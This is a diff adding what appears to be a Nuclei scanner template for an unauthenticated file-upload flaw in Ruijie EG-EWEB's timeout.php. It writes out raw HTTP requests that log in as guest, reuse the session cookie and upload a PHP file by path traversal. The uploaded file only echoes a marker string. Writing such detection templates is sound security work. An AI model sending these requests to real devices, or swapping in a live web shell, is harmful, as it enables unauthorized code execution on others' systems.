@@ -1,0 +1,54 @@
+id: RuiJie-EWEB-timeout-uploadToRCE
+
+info:
+  name: Ruijie EG-EWEB Timeout.php Arbitrary File Upload
+  author: iSee857
+  severity: critical
+  description: Ruijie EG-EWEB timeout.php allows unauthenticated attackers to upload arbitrary files via path traversal, leading to remote code execution.
+  reference:
+    - https://github.com/iSee857
+  tags: ruijie,rce,file-upload
+
+variables:
+  filename: "112233.php"
+  checkstr: "1234567891011"
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/login.php HTTP/1.1
+        Host: {{Host}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0
+        Content-Length: 30
+
+        username=guest&password=guest?
+
+      - |
+        POST /system_pi/timeout.php?a=upload HTTP/1.1
+        Host: {{Host}}
+        X-Requested-With: XMLHttpRequest
+        Cookie: RUIJIEID={{ruijie_cookie}} 
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 78
+
+        fileName=../tmp/html/{{filename}}&mes=%3C%3Fphp%20echo%20{{checkstr}}%3B%3F%3E
+
+
+    cookie-reuse: true
+    unsafe: true
+
+    extractors:
+      - type: regex
+        name: ruijie_cookie
+        part: header
+        internal: true
+        group: 1
+        regex:
+          - 'RUIJIEID=([^;\s]+)'
+
+    matchers:
+      - type: word
+        words:
+          - "true"
+        part: body
